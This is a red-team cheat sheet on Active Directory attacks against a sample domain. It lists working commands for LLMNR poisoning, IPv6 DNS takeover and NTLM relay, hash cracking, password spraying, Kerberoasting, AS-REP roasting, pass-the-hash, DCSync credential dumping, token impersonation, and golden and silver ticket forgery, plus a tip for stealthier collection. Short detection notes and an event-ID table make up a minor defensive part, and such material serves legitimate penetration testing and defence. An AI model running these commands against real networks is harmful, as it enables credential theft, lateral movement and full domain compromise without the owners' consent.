---
title: "Active Directory Attacks"
subtitle: "Techniques, Tools & Detection"
category: "Red Team"
author: "RootSec"
date: "2026-04-02"
version: "1.2"
logo: ""
two_column: false
---

# Active Directory Attacks

A practical reference for common AD attack techniques, tooling, and detection notes.

---

## Initial Enumeration

Before launching any attacks, enumerate the environment to understand the AD structure.

### BloodHound / SharpHound

```powershell
# Collect all data (requires domain credentials)
.\SharpHound.exe -c All --zipfilename bloodhound_out.zip

# Run from Linux with impacket credentials
bloodhound-python -u 'user' -p 'pass' -d acme.local -ns 10.0.0.5 -c All
```

!!! note "Tip"
    Use `-c DCOnly` for stealthy collection that only queries the DC — avoids touching endpoints.

### LDAP Enumeration (ldapdomaindump)

```bash
ldapdomaindump -u 'ACME\user' -p 'Password123!' 10.0.0.5 -o /tmp/ldap_out/
```

**Outputs:** `domain_users.html`, `domain_groups.html`, `domain_computers.html`

---

## Credential Capture

### LLMNR / NBT-NS Poisoning

Capture NTLMv2 hashes from hosts on the same subnet performing name resolution.

```bash
# Start Responder
sudo python Responder.py -I eth0 -rdw

# Hashes saved to: /usr/share/responder/logs/
```

!!! danger "Detection"
    SIEM rule: alert on LLMNR responses from non-DC hosts. Windows Event ID **5137** (Directory Service Object Created) can indicate poisoning activity.

### MITM6 (IPv6 DNS Takeover)

Exploit Windows preferring IPv6 DNS to capture credentials and perform relay attacks.

```bash
# Step 1: Start mitm6 (poisons IPv6 DNS)
sudo mitm6 -d acme.local

# Step 2: Relay with ntlmrelayx to LDAP (dumps domain info)
ntlmrelayx.py -6 -t ldaps://10.0.0.5 --delegate-access
```

---

## Password Attacks

### Offline Cracking (Hashcat)

| Hash Type | Hashcat Mode | Example |
|---|---|---|
| NTLMv2 (Net-NTLMv2) | `-m 5600` | `hashcat -m 5600 hashes.txt rockyou.txt` |
| NTLM (Pass-the-Hash format) | `-m 1000` | `hashcat -m 1000 ntlm.txt rockyou.txt` |
| Kerberos TGS (Kerberoasting) | `-m 13100` | `hashcat -m 13100 tgs.txt rockyou.txt` |
| Kerberos AS-REP | `-m 18200` | `hashcat -m 18200 asrep.txt rockyou.txt` |

```bash
# With rules for better coverage
hashcat -m 5600 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack (e.g. Season + Year pattern)
hashcat -m 1000 ntlm.txt -a 3 ?u?l?l?l?l?d?d?d?d!
```

### Password Spraying

```bash
# CrackMapExec — spray across SMB
crackmapexec smb 10.0.0.0/24 -u users.txt -p 'Winter2026!' --continue-on-success

# Ruler — O365 spray (external)
ruler --domain acme.com brute --users users.txt --passwords passwords.txt
```

!!! warning "Lockout Risk"
    Check the domain lockout policy **before** spraying. Default is 5 attempts/30 min.
    Use `net accounts /domain` or `(Get-ADDefaultDomainPasswordPolicy).LockoutThreshold`.

---

## Kerberoasting

Target service accounts with SPNs set — request TGS tickets and crack offline.

```bash
# Impacket (remote, no tools on target)
GetUserSPNs.py acme.local/user:Password123! -dc-ip 10.0.0.5 -request -outputfile tgs_hashes.txt

# PowerView (on Windows)
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv -NoTypeInformation tgs.csv
```

```bash
# Crack
hashcat -m 13100 tgs_hashes.txt rockyou.txt -r best64.rule
```

!!! note "Detection"
    Windows Event **4769** (Kerberos Service Ticket Request) — monitor for unusual SPNs
    or high volume of 4769s with encryption type **0x17** (RC4) from a single source.

---

## AS-REP Roasting

Target users with "Do not require Kerberos preauthentication" enabled.

```bash
# Find and roast (no credentials needed!)
GetNPUsers.py acme.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip 10.0.0.5

# With valid credentials (find all vulnerable accounts)
GetNPUsers.py acme.local/user:Password123! -request -dc-ip 10.0.0.5
```

```bash
hashcat -m 18200 asrep.txt rockyou.txt
```

---

## Lateral Movement

### Pass the Hash (PtH)

Use NTLM hash without knowing the plaintext password.

```bash
# CrackMapExec
crackmapexec smb 10.0.0.10 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:8d969eef6ecad3c29a3a629280e686cf'

# Impacket wmiexec
wmiexec.py -hashes ':8d969eef6ecad3c29a3a629280e686cf' Administrator@10.0.0.10

# Evil-WinRM
evil-winrm -i 10.0.0.10 -u Administrator -H '8d969eef6ecad3c29a3a629280e686cf'
```

!!! warning "Detection"
    Event **4624** logon type **3** with NTLMv1/v2 and a known admin hash source.
    Implement **Protected Users** security group to block PtH for sensitive accounts.

### Pass the Ticket (PtT) / Overpass the Hash

```powershell
# Overpass the Hash — convert NTLM hash to Kerberos TGT
sekurlsa::pth /user:Administrator /domain:acme.local /ntlm:<hash> /run:powershell.exe
```

---

## Privilege Escalation

### DCSync Attack

Replicate AD to dump all hashes — requires `Replicating Directory Changes` rights.

```bash
# Impacket secretsdump (remote)
secretsdump.py acme.local/Administrator:Password@10.0.0.5 -just-dc-ntds

# Mimikatz (on Windows with DA)
lsadump::dcsync /domain:acme.local /all /csv
```

!!! danger "Impact"
    DCSync dumps **krbtgt** hash → enables Golden Ticket. Treat as full domain compromise.

### Token Impersonation

```powershell
# List available tokens
.\IncognitoNet.exe list_tokens -u

# Impersonate SYSTEM or domain admin token
.\IncognitoNet.exe impersonate_token "ACME\Domain Admins"
```

---

## Persistence

### Golden Ticket

Forge a TGT using the `krbtgt` hash — valid for 10 years by default.

```bash
# Create golden ticket (requires: domain SID, krbtgt hash)
ticketer.py -nthash <krbtgt_ntlm> -domain-sid S-1-5-21-xxx -domain acme.local Administrator

# Use the ticket
export KRB5CCNAME=./Administrator.ccache
psexec.py -k -no-pass Administrator@dc01.acme.local
```

### Silver Ticket

Forge a TGS for a specific service — quieter than Golden Ticket (no DC contact).

```bash
ticketer.py -nthash <service_ntlm> -domain-sid S-1-5-21-xxx -domain acme.local \
  -spn cifs/server01.acme.local -user-id 500 Administrator
```

---

## Quick Reference — Common Event IDs

| Event ID | Description | Relevance |
|---|---|---|
| 4624 | Successful logon | Track logon types 2,3,10 |
| 4625 | Failed logon | Brute force / spray indicator |
| 4648 | Logon with explicit credentials | Lateral movement |
| 4672 | Special privileges assigned | Admin logon |
| 4698 | Scheduled task created | Persistence |
| 4769 | Kerberos TGS request | Kerberoasting (RC4 = suspect) |
| 4776 | NTLM auth attempt | PtH / spraying |
| 7045 | Service installed | Persistence / C2 |

---

## References

- [MITRE ATT&CK — Active Directory](https://attack.mitre.org/tactics/TA0006/)
- [SpecterOps BloodHound Docs](https://bloodhound.readthedocs.io/)
- [HackTricks — Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [PayloadsAllTheThings — AD](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [Impacket Examples](https://github.com/fortra/impacket/tree/master/examples)
